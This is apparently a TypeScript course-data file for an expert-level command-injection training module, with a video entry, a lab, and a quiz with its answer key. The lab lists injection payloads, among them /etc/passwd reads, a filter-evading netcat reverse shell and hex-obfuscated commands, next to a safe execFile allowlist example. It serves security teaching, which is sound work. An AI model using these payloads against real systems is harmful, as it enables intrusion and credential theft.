import { CourseModule } from '../../../types/course';

export const commandInjectionLevel3Modules: CourseModule[] = [
  {
    id: 'cmd-level3-intro',
    title: 'Level 3: Expert Command Injection & Defense',
    duration: '2.5h',
    type: 'video',
    status: 'available',
    description: 'Master expert-level command injection techniques and comprehensive defense strategies.',
    videoUrl: 'https://example.com/videos/expert-cmd-injection',
  },
  {
    id: 'cmd-level3-lab',
    title: 'Expert Command Injection Lab',
    duration: '4h',
    type: 'lab',
    status: 'available',
    description: 'Practice advanced exploitation and implement robust defense mechanisms.',
    labInstructions: `
Expert Command Injection Laboratory

1. Advanced Attack Vectors:
   - Polyglot command injection
   - Advanced filter bypass
   - Custom shell techniques
   - Advanced data exfiltration

2. Expert Techniques:
   \`\`\`bash
   # Advanced filter bypass
   127.0.0.1 {cat,/etc/passwd}
   
   # Reverse shell techniques
   127.0.0.1 $(which nc)$IFS-e$IFS/bin/sh$IFS127.0.0.1$IFS4444
   
   # Advanced command obfuscation
   127.0.0.1 \`echo -e "\\x77\\x68\\x6f\\x61\\x6d\\x69"\`
   
   # Process substitution
   127.0.0.1 <(cat /etc/passwd)
   \`\`\`

3. Defense Implementation:
   \`\`\`javascript
   // Secure command execution
   const { execFile } = require('child_process');
   const allowedCommands = ['ping', 'traceroute'];
   
   function secureExec(command, args) {
     if (!allowedCommands.includes(command)) {
       throw new Error('Command not allowed');
     }
     
     return new Promise((resolve, reject) => {
       execFile(command, args, {
         timeout: 5000,
         maxBuffer: 1024 * 1024,
         shell: false
       }, (error, stdout, stderr) => {
         if (error) reject(error);
         resolve(stdout);
       });
     });
   }
   \`\`\`

4. Enterprise Defense:
   - WAF implementation
   - System hardening
   - Logging and monitoring
   - Incident response
    `,
  },
  {
    id: 'cmd-level3-quiz',
    title: 'Expert Command Injection Assessment',
    duration: '1.5h',
    type: 'quiz',
    status: 'available',
    description: 'Validate your expert-level knowledge of command injection security.',
    questions: [
      {
        question: 'Which Node.js function is safest for command execution?',
        options: [
          'child_process.execFile',
          'child_process.exec',
          'eval',
          'system',
        ],
        correctAnswer: 0,
      },
      {
        question: 'What is a command injection polyglot?',
        options: [
          'A payload that works across multiple operating systems',
          'A multi-line command',
          'A system call',
          'A type of shell script',
        ],
        correctAnswer: 0,
      },
      {
        question: 'Which defense mechanism is most effective against command injection?',
        options: [
          'Command whitelisting with proper validation',
          'Simple input escaping',
          'Removing error messages',
          'Using custom encoding',
        ],
        correctAnswer: 0,
      },
      {
        question: 'What is the purpose of process substitution in command injection?',
        options: [
          'To use command output as a file',
          'To execute faster commands',
          'To bypass authentication',
          'To modify file permissions',
        ],
        correctAnswer: 0,
      },
    ],
  },
];